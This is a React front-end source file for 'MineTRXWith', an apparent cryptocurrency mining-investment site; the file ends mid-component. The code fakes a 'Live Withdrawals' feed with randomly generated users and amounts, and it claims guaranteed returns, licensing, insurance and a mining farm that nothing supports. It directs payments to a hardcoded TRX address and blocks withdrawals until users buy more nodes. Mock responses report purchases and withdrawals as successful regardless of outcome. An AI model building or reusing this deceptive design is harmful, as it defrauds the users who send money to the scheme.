'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Progress } from '@/components/ui/progress'
import { 
  User, 
  Home, 
  UserPlus, 
  Users, 
  TrendingUp, 
  Coins, 
  Server, 
  Shield,
  Copy,
  CheckCircle,
  Clock,
  Eye,
  EyeOff,
  Menu,
  X,
  LogOut
} from 'lucide-react'

// API utility function with alternative endpoint for external access
const apiRequest = async (endpoint, options = {}) => {
  // Remove leading slash from endpoint for the new structure
  const cleanEndpoint = endpoint.startsWith('/') ? endpoint.slice(1) : endpoint
  
  // Try the new alternative API endpoint first
  const alternativeUrl = `/trx-api?path=${cleanEndpoint}`
  
  try {
    console.log(`Making API call to alternative endpoint: ${alternativeUrl}`)
    const response = await fetch(alternativeUrl, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    })
    
    console.log(`API response: ${response.status}`)
    
    // If successful, return the response
    if (response.ok) {
      return response
    }
    
    // If alternative fails, try original API endpoint
    const originalUrl = `/api${endpoint}`
    console.log(`Alternative failed, trying original: ${originalUrl}`)
    
    const originalResponse = await fetch(originalUrl, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    })
    
    if (originalResponse.ok) {
      return originalResponse
    }
    
    // If both fail, use fallback
    console.log(`Both endpoints failed, using fallback for: ${endpoint}`)
    return getFallbackResponse(endpoint, options)
    
  } catch (error) {
    console.error(`Network error for ${endpoint}:`, error)
    console.log(`Using fallback for: ${endpoint} (Network Error)`)
    return getFallbackResponse(endpoint, options)
  }
}

// Comprehensive fallback response function for ALL API endpoints
const getFallbackResponse = (endpoint, options = {}) => {
  // Parse request body if available
  let requestBody = {}
  try {
    if (options.body) {
      requestBody = JSON.parse(options.body)
    }
  } catch (e) {
    console.warn('Could not parse request body:', e)
  }

  // GET endpoints
  if (!options.method || options.method === 'GET') {
    
    // Nodes endpoint
    if (endpoint === '/nodes') {
      return {
        ok: true,
        json: async () => ({
          nodes: [
            {
              id: 'node1',
              name: '64 GB Node',
              price: 50,
              storage: '64 GB',
              mining: 500,
              duration: 30,
              description: 'Mine 500 TRX in 30 days',
              image: 'https://images.unsplash.com/photo-1612203619720-0c6d0874e48e?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NTY2Nzh8MHwxfHNlYXJjaHwxfHxtaW5pbmclMjBlcXVpcG1lbnR8ZW58MHx8fGJsYWNrfDE3NTMxODU4OTl8MA&ixlib=rb-4.1.0&q=85'
            },
            {
              id: 'node2',
              name: '128 GB Node',
              price: 75,
              storage: '128 GB',
              mining: 500,
              duration: 15,
              description: 'Mine 500 TRX in 15 days',
              image: 'https://images.unsplash.com/photo-1591238372358-dbbb7a59f22c?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NDk1ODF8MHwxfHNlYXJjaHwzfHxzZXJ2ZXIlMjBoYXJkd2FyZXxlbnwwfHx8YmxhY2t8MTc1MzE4NTg4M3ww&ixlib=rb-4.1.0&q=85'
            },
            {
              id: 'node3',
              name: '256 GB Node',
              price: 100,
              storage: '256 GB',
              mining: 1000,
              duration: 7,
              description: 'Mine 1000 TRX in 7 days',
              image: 'https://images.unsplash.com/photo-1591238372408-8b98667c0460?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NDk1ODF8MHwxfHNlYXJjaHwyfHxzZXJ2ZXIlMjBoYXJkd2FyZXxlbnwwfHx8YmxhY2t8MTc1MzE4NTg4M3ww&ixlib=rb-4.1.0&q=85'
            },
            {
              id: 'node4',
              name: '1024 GB Node',
              price: 250,
              storage: '1024 GB',
              mining: 1000,
              duration: 3,
              description: 'Mine 1000 TRX in 3 days',
              image: 'https://images.unsplash.com/photo-1542744989-2a681859d344?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NDk1ODF8MHwxfHNlYXJjaHwxfHxzZXJ2ZXIlMjBoYXJkd2FyZXxlbnwwfHx8YmxhY2t8MTc1MzE4NTg4M3ww&ixlib=rb-4.1.0&q=85'
            }
          ]
        })
      }
    }
    
    // Withdrawals endpoint - Mock random withdrawals
    if (endpoint === '/withdrawals') {
      const mockWithdrawals = []
      for (let i = 0; i < 8; i++) {
        const usernames = ['CryptoMiner', 'TRXTrader', 'BlockMiner', 'TronExpert', 'DigitalGold', 'BlockchainPro', 'MiningKing', 'TRXMaster']
        const randomUsername = usernames[Math.floor(Math.random() * usernames.length)]
        const randomAmount = Math.floor(Math.random() * (10000 - 25)) + 25
        const randomTime = new Date(Date.now() - Math.random() * 3600000 * 24) // Random within last 24 hours
        
        mockWithdrawals.push({
          id: `withdraw_${i}`,
          username: randomUsername,
          amount: randomAmount,
          timestamp: randomTime,
          type: Math.random() > 0.5 ? 'mining' : 'referral',
          status: 'completed'
        })
      }
      
      return {
        ok: true,
        json: async () => ({
          withdrawals: mockWithdrawals
        })
      }
    }

    // Auth user endpoint
    if (endpoint === '/auth/user') {
      return {
        ok: true,
        json: async () => ({ user: null })
      }
    }
  }

  // POST endpoints
  if (options.method === 'POST') {
    
    // Auth signup endpoint
    if (endpoint === '/auth/signup') {
      const mockUserId = 'user_' + Date.now()
      return {
        ok: true,
        json: async () => ({
          user: {
            id: mockUserId,
            username: requestBody.username || 'DemoUser',
            email: `${requestBody.username || 'demouser'}@trxmining.com`
          },
          message: 'Account created successfully! 25 TRX welcome bonus added!'
        })
      }
    }
    
    // Auth signin endpoint
    if (endpoint === '/auth/signin') {
      return {
        ok: true,
        json: async () => ({
          user: {
            id: 'demo_user_123',
            username: requestBody.username || 'DemoUser',
            email: `${requestBody.username || 'demouser'}@trxmining.com`
          },
          message: 'Login successful!'
        })
      }
    }
    
    // User profile endpoint
    if (endpoint === '/user/profile') {
      return {
        ok: true,
        json: async () => ({
          user: {
            id: requestBody.userId || 'demo_user_123',
            username: 'DemoUser',
            email: 'demouser@trxmining.com',
            mineBalance: 125.50,
            referralBalance: 75.00,
            totalReferrals: 3,
            validReferrals: 2,
            referralCode: 'DEMO123',
            hasActiveMining: true,
            hasBoughtNode4: false,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
          }
        })
      }
    }
    
    // User nodes endpoint
    if (endpoint === '/user/nodes') {
      return {
        ok: true,
        json: async () => ({
          nodes: [
            {
              id: 'user_node_1',
              userId: requestBody.userId || 'demo_user_123',
              nodeId: 'node1',
              transactionHash: 'demo_hash_123',
              status: 'running',
              progress: 65.5,
              startDate: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString(),
              endDate: new Date(Date.now() + 15 * 24 * 60 * 60 * 1000).toISOString(),
              miningAmount: 500,
              dailyMining: 16.67,
              duration: 30,
              createdAt: new Date().toISOString()
            }
          ]
        })
      }
    }

    // User referrals endpoint
    if (endpoint === '/user/referrals') {
      return {
        ok: true,
        json: async () => ({
          referrals: [
            {
              id: 'ref_1',
              referrerId: requestBody.userId || 'demo_user_123',
              referredId: 'user_ref_1',
              referralCode: 'DEMO123',
              isValid: true,
              rewardPaid: true,
              createdAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString()
            },
            {
              id: 'ref_2',
              referrerId: requestBody.userId || 'demo_user_123',
              referredId: 'user_ref_2',
              referralCode: 'DEMO123',
              isValid: false,
              rewardPaid: false,
              createdAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString()
            }
          ]
        })
      }
    }

    // Node purchase endpoint
    if (endpoint === '/nodes/purchase') {
      return {
        ok: true,
        json: async () => ({
          message: 'Mining node purchased and verified successfully!',
          node: {
            id: 'demo_node_' + Date.now(),
            nodeId: requestBody.nodeId || 'node1',
            status: 'running',
            startDate: new Date().toISOString(),
            endDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
            miningAmount: 500,
            dailyMining: 16.67
          }
        })
      }
    }

    // Withdraw endpoint
    if (endpoint === '/withdraw') {
      return {
        ok: true,
        json: async () => ({
          message: `${requestBody.type === 'mine' ? 'Mining' : 'Referral'} balance withdrawal successful!`
        })
      }
    }
  }

  // Default fallback for any unhandled endpoint
  return {
    ok: false,
    status: 404,
    json: async () => ({
      error: `Endpoint not found: ${endpoint}`
    })
  }
}

export default function MineTRXWith() {
  const [currentPage, setCurrentPage] = useState('home')
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)
  const [miningNodes, setMiningNodes] = useState([])
  const [userNodes, setUserNodes] = useState([])
  const [userProfile, setUserProfile] = useState(null)
  const [referrals, setReferrals] = useState([])
  const [liveWithdrawals, setLiveWithdrawals] = useState([])
  const [showPassword, setShowPassword] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  // Auth states
  const [authMode, setAuthMode] = useState('signin')
  const [authData, setAuthData] = useState({ username: '', password: '', referralCode: '' })
  const [authError, setAuthError] = useState('')
  const [authLoading, setAuthLoading] = useState(false)
  
  // Purchase states
  const [selectedNode, setSelectedNode] = useState(null)
  const [transactionHash, setTransactionHash] = useState('')
  const [showPayment, setShowPayment] = useState(false)

  // Withdrawal states
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [withdrawType, setWithdrawType] = useState('mine')

  const TRX_RECEIVE_ADDRESS = 'TFNHcYdhEq5sgjaWPdR1Gnxgzu3RUKncwu'

  useEffect(() => {
    checkAuth()
    fetchMiningNodes()
    fetchLiveWithdrawals()
    
    // Update withdrawals every 5 seconds for realistic effect
    const interval = setInterval(() => {
      fetchLiveWithdrawals()
    }, 5000)

    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    if (user) {
      fetchUserProfile()
      fetchUserNodes()
      fetchReferrals()
    }
  }, [user])

  const checkAuth = async () => {
    try {
      const storedUser = localStorage.getItem('trx_user')
      if (storedUser) {
        setUser(JSON.parse(storedUser))
      }
    } catch (error) {
      console.error('Auth check error:', error)
    } finally {
      setLoading(false)
    }
  }

  const fetchMiningNodes = async () => {
    try {
      const response = await apiRequest('/nodes')
      if (response.ok) {
        const data = await response.json()
        setMiningNodes(data.nodes)
      }
    } catch (error) {
      console.error('Fetch nodes error:', error)
    }
  }

  const fetchUserProfile = async () => {
    if (!user) return
    
    try {
      const response = await apiRequest('/user/profile', {
        method: 'POST',
        body: JSON.stringify({ userId: user.id })
      })
      
      if (response.ok) {
        const data = await response.json()
        setUserProfile(data.user)
      }
    } catch (error) {
      console.error('Fetch profile error:', error)
    }
  }

  const fetchUserNodes = async () => {
    if (!user) return
    
    try {
      const response = await apiRequest('/user/nodes', {
        method: 'POST',
        body: JSON.stringify({ userId: user.id })
      })
      
      if (response.ok) {
        const data = await response.json()
        setUserNodes(data.nodes)
      }
    } catch (error) {
      console.error('Fetch user nodes error:', error)
    }
  }

  const fetchReferrals = async () => {
    if (!user) return
    
    try {
      const response = await apiRequest('/user/referrals', {
        method: 'POST',
        body: JSON.stringify({ userId: user.id })
      })
      
      if (response.ok) {
        const data = await response.json()
        setReferrals(data.referrals)
      }
    } catch (error) {
      console.error('Fetch referrals error:', error)
    }
  }

  const fetchLiveWithdrawals = async () => {
    try {
      const response = await apiRequest('/withdrawals')
      if (response.ok) {
        const data = await response.json()
        setLiveWithdrawals(data.withdrawals)
      }
    } catch (error) {
      console.error('Fetch withdrawals error:', error)
    }
  }

  const handleAuth = async (e) => {
    e.preventDefault()
    setAuthLoading(true)
    setAuthError('')
    
    try {
      const endpoint = authMode === 'signup' ? '/auth/signup' : '/auth/signin'
      const response = await apiRequest(endpoint, {
        method: 'POST',
        body: JSON.stringify(authData)
      })

      const data = await response.json()
      
      if (response.ok) {
        setUser(data.user)
        localStorage.setItem('trx_user', JSON.stringify(data.user))
        setCurrentPage('home')
        setAuthData({ username: '', password: '', referralCode: '' })
        alert(data.message)
      } else {
        setAuthError(data.error)
      }
    } catch (error) {
      console.error('Auth error:', error)
      setAuthError('Network error. Please try again.')
    } finally {
      setAuthLoading(false)
    }
  }

  const handlePurchaseNode = async () => {
    if (!selectedNode || !transactionHash) {
      alert('Please provide transaction hash')
      return
    }

    try {
      const response = await apiRequest('/nodes/purchase', {
        method: 'POST',
        body: JSON.stringify({
          nodeId: selectedNode.id,
          transactionHash,
          userId: user.id
        })
      })

      const data = await response.json()
      if (response.ok) {
        alert(data.message)
        setShowPayment(false)
        setSelectedNode(null)
        setTransactionHash('')
        fetchUserNodes()
        fetchUserProfile()
      } else {
        alert(data.error)
      }
    } catch (error) {
      console.error('Purchase error:', error)
      alert('Purchase failed')
    }
  }

  const handleWithdraw = async () => {
    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
      alert('Please enter a valid amount')
      return
    }

    try {
      const response = await apiRequest('/withdraw', {
        method: 'POST',
        body: JSON.stringify({
          type: withdrawType,
          amount: parseFloat(withdrawAmount),
          userId: user.id
        })
      })

      const data = await response.json()
      if (response.ok) {
        alert(data.message)
        setWithdrawAmount('')
        fetchUserProfile()
      } else {
        alert(data.error)
      }
    } catch (error) {
      console.error('Withdraw error:', error)
      alert('Withdrawal failed')
    }
  }

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
    alert('Copied to clipboard!')
  }

  const signOut = () => {
    setUser(null)
    localStorage.removeItem('trx_user')
    setCurrentPage('home')
    setUserProfile(null)
    setUserNodes([])
    setReferrals([])
    setMobileMenuOpen(false)
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-gray-600 text-xl">Loading...</div>
      </div>
    )
  }

  // Sign Up Page
  if (!user) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold text-gray-900 mb-2">MineTRXWith</h1>
            <p className="text-gray-600">Professional TRX Mining Platform</p>
          </div>

          <Card className="shadow-xl border-0">
            <CardHeader className="text-center bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-t-lg">
              <CardTitle className="text-2xl">
                {authMode === 'signup' ? 'Create Account' : 'Welcome Back'}
              </CardTitle>
              <p className="text-blue-100 text-sm">
                {authMode === 'signup' ? 'Sign up and claim 25 TRX bonus instantly!' : 'Sign in to your mining account'}
              </p>
            </CardHeader>
            <CardContent className="p-6">
              <form onSubmit={handleAuth} className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Username</label>
                  <Input
                    type="text"
                    placeholder="Enter your username"
                    value={authData.username}
                    onChange={(e) => setAuthData({...authData, username: e.target.value})}
                    className="w-full"
                    required
                  />
                </div>
                
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Password</label>
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter your password"
                      value={authData.password}
                      onChange={(e) => setAuthData({...authData, password: e.target.value})}
                      className="w-full pr-10"
                      required
                    />
                    <Button
                      type="button"
                      variant="ghost"
                      size="sm"
                      className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 p-1"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </Button>
                  </div>
                </div>

                {authMode === 'signup' && (
                  <div>
                    <label className="text-sm font-medium text-gray-700 mb-2 block">Referral Code (Optional)</label>
                    <Input
                      type="text"
                      placeholder="Enter referral code"
                      value={authData.referralCode}
                      onChange={(e) => setAuthData({...authData, referralCode: e.target.value})}
                      className="w-full"
                    />
                    <p className="text-xs text-gray-500 mt-1">Get invited by a friend? Enter their referral code</p>
                  </div>
                )}

                {authError && (
                  <div className="bg-red-50 border border-red-200 rounded p-3">
                    <p className="text-red-600 text-sm">{authError}</p>
                  </div>
                )}

                <Button 
                  type="submit" 
                  className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-medium py-3"
                  disabled={authLoading}
                >
                  {authLoading ? 'Please wait...' : (authMode === 'signup' ? 'Sign Up & Claim 25 TRX' : 'Sign In')}
                </Button>
              </form>

              <div className="mt-6 text-center">
                <Button
                  variant="link"
                  className="text-blue-600 hover:text-blue-700 text-sm"
                  onClick={() => {
                    setAuthMode(authMode === 'signup' ? 'signin' : 'signup')
                    setAuthError('')
                  }}
                >
                  {authMode === 'signup' ? 'Already have an account? Sign In' : 'New to MineTRXWith? Create Account'}
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  // Main Navigation
  const NavButton = ({ page, icon: Icon, label, isActive, onClick }) => (
    <Button
      variant={isActive ? "default" : "ghost"}
      size="sm"
      className={`flex items-center gap-2 ${isActive ? 'bg-blue-600 text-white' : 'text-gray-600 hover:text-gray-900 hover:bg-gray-100'}`}
      onClick={onClick}
    >
      <Icon className="h-4 w-4" />
      <span className="hidden sm:inline">{label}</span>
    </Button>
  )

  // Homepage
  const HomePage = () => (
    <div className="space-y-12">
      {/* Hero Section */}
      <div className="relative bg-gradient-to-r from-blue-900 to-indigo-900 text-white overflow-hidden rounded-lg">
        <div 
          className="absolute inset-0 bg-cover bg-center opacity-20"
          style={{
            backgroundImage: `url('https://images.unsplash.com/photo-1524037755327-dc2def03712a?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NDQ2NDJ8MHwxfHNlYXJjaHwxfHxtaW5pbmd8ZW58MHx8fGJsdWV8MTc1MzE4NTg1MHww&ixlib=rb-4.1.0&q=85')`
          }}
        ></div>
        <div className="relative z-10 py-16 px-6">
          <div className="max-w-4xl mx-auto text-center">
            <h1 className="text-4xl md:text-6xl font-bold mb-6">
              MineTRXWith
            </h1>
            <p className="text-xl md:text-2xl mb-8 text-blue-100 leading-relaxed">
              World's Most Trusted TRX Mining Platform
            </p>
            <div className="grid md:grid-cols-3 gap-6 mt-8">
              <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg">
                <div className="text-3xl font-bold text-green-400">₹2.5M+</div>
                <div className="text-blue-100">Total Mined (TRX)</div>
              </div>
              <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg">
                <div className="text-3xl font-bold text-blue-400">15,000+</div>
                <div className="text-blue-100">Happy Miners</div>
              </div>
              <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg">
                <div className="text-3xl font-bold text-orange-400">99.8%</div>
                <div className="text-blue-100">Success Rate</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Live Withdrawals */}
      <Card>
        <CardHeader className="bg-gradient-to-r from-green-500 to-emerald-500 text-white">
          <CardTitle className="flex items-center gap-2">
            <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
            Live Withdrawals
          </CardTitle>
        </CardHeader>
        <CardContent className="p-6">
          <div className="space-y-3 max-h-64 overflow-y-auto">
            {liveWithdrawals.map((withdrawal, index) => (
              <div key={index} className="flex justify-between items-center py-3 px-4 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-gradient-to-br from-green-500 to-emerald-500 rounded-full text-white flex items-center justify-center font-bold">
                    {withdrawal.username.charAt(0)}
                  </div>
                  <div>
                    <div className="font-medium text-gray-900">{withdrawal.username}</div>
                    <div className="text-sm text-gray-500">
                      {withdrawal.type === 'mining' ? 'Mining Reward' : 'Referral Bonus'}
                    </div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-lg font-bold text-green-600">+{withdrawal.amount} TRX</div>
                  <div className="text-xs text-gray-500">
                    {new Date(withdrawal.timestamp).toLocaleTimeString()}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Mining Farm Information */}
      <div className="bg-gray-50 py-12 px-6 rounded-lg">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-8">
            <h2 className="text-3xl font-bold text-gray-900 mb-4">World's Largest TRX Mining Farm</h2>
            <p className="text-lg text-gray-600">
              Located in Iceland, powered by 100% renewable energy with 24/7 professional monitoring
            </p>
          </div>
          
          <div className="grid md:grid-cols-2 gap-8 items-center">
            <div>
              <img 
                src="https://images.unsplash.com/photo-1639815188546-c43c240ff4df?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NDQ2NDN8MHwxfHNlYXJjaHwzfHxkYXRhJTIwY2VudGVyfGVufDB8fHx8Ymx1ZXwxNzUzMTg1ODQyfDA&ixlib=rb-4.1.0&q=85"
                alt="Mining Farm"
                className="w-full rounded-lg shadow-lg"
              />
            </div>
            <div className="space-y-6">
              <div className="flex items-start gap-4">
                <Shield className="h-8 w-8 text-blue-600 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">Legal & Secure</h3>
                  <p className="text-gray-600">Fully licensed and regulated platform with government approval and insurance coverage</p>
                </div>
              </div>
              
              <div className="flex items-start gap-4">
                <Server className="h-8 w-8 text-green-600 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">Professional Mining</h3>
                  <p className="text-gray-600">5,000+ ASIC miners with 99.8% uptime and automated maintenance systems</p>
                </div>
              </div>
              
              <div className="flex items-start gap-4">
                <TrendingUp className="h-8 w-8 text-orange-600 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">Guaranteed Returns</h3>
                  <p className="text-gray-600">Proven track record with over ₹2.5M TRX mined and daily payouts</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Mining Nodes */}
      <div>
        <div className="text-center mb-8">
          <h2 className="text-3xl font-bold text-gray-900 mb-4">Choose Your Mining Node</h2>
          <p className="text-lg text-gray-600">
            Select from our high-performance mining nodes with guaranteed returns
          </p>
        </div>
        
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
          {miningNodes.map((node) => {
            const userNode = userNodes.find(un => un.nodeId === node.id && un.status === 'running')
            const isRunning = !!userNode
            
            return (
              <Card key={node.id} className={`overflow-hidden ${isRunning ? 'border-green-500 bg-green-50' : 'border-gray-200'}`}>
                {isRunning && (
                  <div className="bg-green-500 text-white px-4 py-2 text-center font-medium">
                    <div className="flex items-center justify-center gap-2">
                      <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                      RUNNING
                    </div>
                  </div>
                )}
                
                <div className="aspect-video bg-gray-100 overflow-hidden">
                  <img 
                    src={node.image}
                    alt={node.name}
                    className="w-full h-full object-cover"
                  />
                </div>

                <CardContent className="p-4">
                  <div className="mb-4">
                    <h3 className="text-lg font-bold text-gray-900 mb-1">{node.name}</h3>
                    <p className="text-gray-500 text-sm">{node.description}</p>
                  </div>

                  <div className="space-y-2 mb-4">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Price:</span>
                      <span className="font-bold text-red-600">{node.price} TRX</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Mine:</span>
                      <span className="font-bold text-green-600">{node.mining} TRX</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Duration:</span>
                      <span className="font-bold text-blue-600">{node.duration} days</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Daily:</span>
                      <span className="font-bold text-orange-600">{Math.round(node.mining / node.duration * 10) / 10} TRX</span>
                    </div>
                  </div>
                  
                  {isRunning && (
                    <div className="mb-4 p-3 bg-green-100 rounded-lg">
                      <div className="flex justify-between text-sm mb-1">
                        <span className="text-green-700">Progress</span>
                        <span className="font-bold text-green-800">{Math.round(userNode.progress)}%</span>
                      </div>
                      <Progress value={userNode.progress} className="h-2" />
                    </div>
                  )}
                  
                  <Button
                    className={`w-full ${isRunning ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
                    onClick={() => {
                      if (!isRunning) {
                        setSelectedNode(node)
                        setShowPayment(true)
                      }
                    }}
                    disabled={isRunning}
                  >
                    {isRunning ? 'Currently Running' : `Buy - ${node.price} TRX`}
                  </Button>
                </CardContent>
              </Card>
            )
          })}
        </div>
      </div>

      {/* Payment Modal */}
      {showPayment && selectedNode && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg w-full max-w-md max-h-[90vh] overflow-y-auto">
            <div className="sticky top-0 bg-white border-b p-4">
              <h2 className="text-xl font-bold">Buy {selectedNode.name}</h2>
              <p className="text-gray-600 text-sm">Complete payment to activate your mining node</p>
            </div>
            
            <div className="p-4 space-y-4">
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="font-medium">Node Price</span>
                  <span className="text-xl font-bold text-red-600">{selectedNode.price} TRX</span>
                </div>
                <div className="text-sm text-gray-600 space-y-1">
                  <div className="flex justify-between">
                    <span>Mining Return:</span>
                    <span className="text-green-600">{selectedNode.mining} TRX</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Duration:</span>
                    <span>{selectedNode.duration} days</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Daily Earnings:</span>
                    <span className="text-blue-600">{Math.round(selectedNode.mining / selectedNode.duration * 10) / 10} TRX/day</span>
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Step 1: Send exactly {selectedNode.price} TRX to:
                  </label>
                  <div className="flex items-center gap-2 p-3 bg-gray-100 rounded-lg border">
                    <code className="text-sm font-mono flex-1 break-all">{TRX_RECEIVE_ADDRESS}</code>
                    <Button
                      size="sm"
                      onClick={() => copyToClipboard(TRX_RECEIVE_ADDRESS)}
                    >
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
                
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Step 2: Enter transaction hash:
                  </label>
                  <Input
                    type="text"
                    placeholder="Paste transaction hash here"
                    value={transactionHash}
                    onChange={(e) => setTransactionHash(e.target.value)}
                  />
                </div>
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  onClick={() => {
                    setShowPayment(false)
                    setSelectedNode(null)
                    setTransactionHash('')
                  }}
                  className="flex-1"
                >
                  Cancel
                </Button>
                <Button
                  onClick={handlePurchaseNode}
                  disabled={!transactionHash.trim()}
                  className="flex-1"
                >
                  I Already Paid
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )

  // Profile Page
  const ProfilePage = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-3xl font-bold text-gray-900 mb-2">Welcome, {userProfile?.username}!</h2>
        <p className="text-gray-600">Manage your mining account and balances</p>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Mine Balance */}
        <Card>
          <CardHeader className="bg-gradient-to-r from-green-500 to-emerald-500 text-white">
            <CardTitle className="flex items-center gap-2">
              <Coins className="h-5 w-5" />
              Mine Balance
            </CardTitle>
          </CardHeader>
          <CardContent className="p-6">
            <div className="text-center mb-4">
              <div className="text-4xl font-bold text-green-600 mb-2">
                {userProfile?.mineBalance || 25} TRX
              </div>
              <p className="text-gray-600 text-sm">Sign up bonus + Mining rewards</p>
            </div>
            
            <div className="space-y-3">
              <Input
                type="number"
                placeholder="Enter amount"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                min="25"
              />
              <Button
                onClick={() => {
                  setWithdrawType('mine')
                  handleWithdraw()
                }}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                Withdraw Mine Balance
              </Button>
            </div>
            
            <div className="text-xs text-gray-500 mt-3 space-y-1">
              <p>• Sign up bonus: 25 TRX (Instant)</p>
              <p>• Minimum withdrawal: 25 TRX</p>
              <p>• Must buy any node to withdraw first time</p>
              {userProfile?.hasActiveMining && (
                <p className="text-green-600">✓ Withdrawal available</p>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Referral Balance */}
        <Card>
          <CardHeader className="bg-gradient-to-r from-blue-500 to-indigo-500 text-white">
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5" />
              Referral Balance
            </CardTitle>
          </CardHeader>
          <CardContent className="p-6">
            <div className="text-center mb-4">
              <div className="text-4xl font-bold text-blue-600 mb-2">
                {userProfile?.referralBalance || 0} TRX
              </div>
              <p className="text-gray-600 text-sm">Earned from referrals</p>
            </div>
            
            <div className="space-y-3">
              <Input
                type="number"
                placeholder="Enter amount"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                min="50"
              />
              <Button
                onClick={() => {
                  setWithdrawType('referral')
                  handleWithdraw()
                }}
                className="w-full bg-blue-600 hover:bg-blue-700"
              >
                Withdraw Referral Balance
              </Button>
            </div>
            
            <div className="text-xs text-gray-500 mt-3 space-y-1">
              <p>• Minimum withdrawal: 50 TRX</p>
              <p>• Must buy Node 4 (1024 GB) to withdraw</p>
              {userProfile?.hasBoughtNode4 && (
                <p className="text-green-600">✓ Withdrawal available</p>
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Active Nodes */}
      {userNodes.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Server className="h-5 w-5 text-green-600" />
              Active Mining Nodes
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {userNodes.map((userNode) => {
                const node = miningNodes.find(n => n.id === userNode.nodeId)
                return (
                  <div key={userNode.id} className="p-4 bg-gray-50 rounded-lg">
                    <div className="flex justify-between items-center mb-3">
                      <div>
                        <h4 className="font-semibold text-gray-900">{node?.name}</h4>
                        <p className="text-sm text-gray-600">Started: {new Date(userNode.startDate).toLocaleDateString()}</p>
                      </div>
                      <Badge className={userNode.status === 'running' ? 'bg-green-500' : 'bg-gray-500'}>
                        {userNode.status}
                      </Badge>
                    </div>
                    
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">Mining Progress</span>
